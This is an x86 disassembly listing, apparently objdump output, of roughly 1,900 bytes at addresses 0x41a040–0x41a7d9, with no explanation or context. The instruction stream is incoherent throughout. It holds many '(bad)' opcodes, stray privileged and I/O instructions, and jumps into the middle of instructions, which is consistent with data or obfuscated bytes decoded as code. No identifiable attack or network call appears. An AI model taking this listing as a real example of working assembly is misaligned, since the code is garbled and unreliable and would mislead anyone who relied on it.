  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
